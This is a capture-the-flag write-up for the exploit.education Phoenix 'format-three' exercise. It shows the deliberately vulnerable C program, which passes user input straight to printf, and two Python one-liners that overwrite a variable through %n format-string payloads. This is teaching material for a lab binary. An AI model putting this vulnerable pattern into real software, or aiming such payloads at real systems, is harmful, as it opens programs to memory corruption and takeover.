# Format Three

## Code

```
/*
 * phoenix/format-three, by https://exploit.education
 *
 * Can you change the "changeme" variable to a precise value?
 *
 * How do you fix a cracked pumpkin? With a pumpkin patch.
 */

#include <err.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

#define BANNER \
  "Welcome to " LEVELNAME ", brought to you by https://exploit.education"

int changeme;

void bounce(char *str) {
  printf(str);
}

int main(int argc, char **argv) {
  char buf[4096];
  printf("%s\n", BANNER);

  if (read(0, buf, sizeof(buf) - 1) <= 0) {
    exit(EXIT_FAILURE);
  }

  bounce(buf);

  if (changeme == 0x64457845) {
    puts("Well done, the 'changeme' variable has been changed correctly!");
  } else {
    printf(
        "Better luck next time - got 0x%08x, wanted 0x64457845!\n", changeme);
  }

  exit(0);
}
```

## Solution
First we need to find the address of changeme, using objdump and searching for the compare. it is at "0x8049844". then with this script we will rewrite the content of the variable with the correct value (0x64457845):

```
python -c 'import struct; print(struct.pack("<I", 0x8049844) + "JUNK" + struct.pack("<I", 0x8049845) + "JUNK" + struct.pack("<I", 0x8049846) + "JUNK" + struct.pack("<I", 0x8049847) + "%x"*10 + "%244x" + "%n" + "%51x" + "%n" + "%205x" + "%n" + "%31x" + "%n")' | ./format-three
```

Another solution will be write 2 byte at a time:
```
python -c 'import struct; print(struct.pack("<I", 0x8049844) + "JUNK" + struct.pack("<I", 0x8049846) + "%x"*10 + "%30724x" + "%n" + "%60416x" + "%n")' | ./format-three
```
